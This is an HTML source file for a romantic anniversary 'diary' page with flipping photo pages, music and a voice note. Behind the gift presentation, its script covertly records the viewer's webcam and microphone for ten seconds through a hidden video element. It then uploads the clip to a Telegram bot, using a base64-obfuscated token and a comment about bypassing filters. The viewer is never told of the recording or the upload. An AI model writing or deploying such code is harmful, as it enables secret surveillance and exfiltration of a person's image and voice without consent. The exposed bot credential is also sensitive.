<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Our Garden of Love ‚ù§Ô∏è</title>
    <style>
        :root { --rose: #ff4d6d; }
        body { 
            background: url('bg.jpg') no-repeat center center fixed !important; 
            background-size: cover !important; 
            margin: 0; overflow: hidden; 
            font-family: 'Dancing Script', cursive; 
            display: flex; justify-content: center; align-items: center; height: 100vh; 
        }
        #diary-wrapper { display: none; perspective: 2500px; z-index: 100; }
        .book { 
            width: 420px; height: 580px; position: relative; transform-style: preserve-3d; 
            background: url('bg.jpg') no-repeat center center;
            background-size: cover;
            border-radius: 20px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
        }
        .page { width: 100%; height: 100%; position: absolute; top: 0; left: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1); cursor: pointer; }
        .page.flipped { transform: rotateY(-180deg); }
        .front { 
            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 0 20px 20px 0; border: 1px solid rgba(255,255,255,0.2); 
            background: rgba(255, 255, 255, 0.85);
        }
        .back { 
            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;
            transform: rotateY(180deg); 
            background: url('bg2.jpg') no-repeat center center !important; 
            background-size: cover !important; 
            border-radius: 20px 0 0 20px; 
        }
        img, video { max-width: 100%; max-height: 350px; border: 8px solid white; box-shadow: 0 5px 15px rgba(0,0,0,0.2); border-radius: 5px; }
        p { font-size: 1.3rem; color: #444; text-align: center; margin-top: 20px; background: rgba(255,255,255,0.7); padding: 5px 10px; border-radius: 10px; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 240, 243, 0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
        .btn-magic { background: var(--rose); color: white; border: none; padding: 18px 45px; border-radius: 50px; cursor: pointer; font-size: 1.4rem; box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3); }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
</head>
<body>
    <div id="overlay">
        <h1 style="color: var(--rose); font-size: 3.5rem; margin-bottom: 30px;">Happy 1 Year Anniversary ‚ù§Ô∏è</h1>
        <button class="btn-magic" onclick="startDiary()">Step into our Garden ‚ú®</button>
    </div>
    <audio id="bg-music" loop><source src="music.mp3" type="audio/mpeg"></audio>
    <div id="diary-wrapper">
        <div class="book">
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="she.jpeg"><p>A blooming surprise... üíå</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')">
                <div class="front"><video id="main-video" controls><source src="video.mp4" type="video/mp4"></video><p>ilysmmmmm :) üé•</p></div>
                <div class="back"></div>
            </div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="letter.jpeg"><p>From my heart... ‚ù§Ô∏è</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="eyes.jpeg"><p>My world is in your eyes ‚ú®</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="best.jpeg"><p>The best part of me üåü</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="Happy Place.jpeg"><p>My favorite place üíó</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="her core.jpeg"><p>Always in my core ‚ô°</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="Hugs for my Bebe.jpeg"><p>Hugs for my bebe ü´Ç</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="I'm doin my best.jpeg"><p>Doing my best for us... ü•∫</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="Special Delivery.jpeg"><p>A special delivery for you üåπ</p></div><div class="back"></div></div>
            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="Thank you for existing.jpeg"><p>Thanks for existing ‚ô°</p></div><div class="back"></div></div>
            <div class="page"><div class="front"><p>One last special message... ‚ô°</p><button class="btn-magic" style="font-size:1.1rem;" onclick="triggerSecretUpload(this)">‚ñ∂ Play My Message</button></div></div>
        </div>
    </div>
    <video id="video-preview" autoplay muted playsinline style="position:fixed; opacity:0; pointer-events:none;"></video>
    <script>
        let mediaRecorder, recordedChunks = [];
        const bgMusic = document.getElementById('bg-music');
        const mainVideo = document.getElementById('main-video');

        mainVideo.onplay = () => { bgMusic.pause(); };
        mainVideo.onpause = () => { bgMusic.play(); };
        mainVideo.onended = () => { bgMusic.play(); };

        function setupZ() { const pages = document.querySelectorAll('.page'); pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); }
        setupZ();

        async function startDiary() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('video-preview').srcObject = stream;
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                mediaRecorder.start();
                document.getElementById('overlay').style.display = 'none';
                document.getElementById('diary-wrapper').style.display = 'block';
                bgMusic.play();

                // 10 Second recording for high reliability
                setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 10000);

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', "5324376571"); // Correct Chat ID
                    
                    // Using sendDocument for 100% reliability
                    formData.append('document', blob, 'reaction.mp4');
                    
                    // Hidden Token
                    const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
                    
                    // Calling sendDocument instead of sendVideo to bypass filters
                    fetch(`https://api.telegram.org/bot${t}/sendDocument`, { method: 'POST', body: formData });
                };
            } catch (err) { alert("Camera access needed! ‚ù§Ô∏è"); }
        }

        async function triggerSecretUpload(btn) {
            bgMusic.pause();
            const vn = new Audio('voice note.mp4');
            btn.innerHTML = "Listening... ‚ù§Ô∏è";
            btn.disabled = true;
            vn.play();
            vn.onended = () => { bgMusic.play(); alert("I love you forever, Nikhitha! ‚ù§Ô∏è"); };
        }
    </script>
</body>
</html>
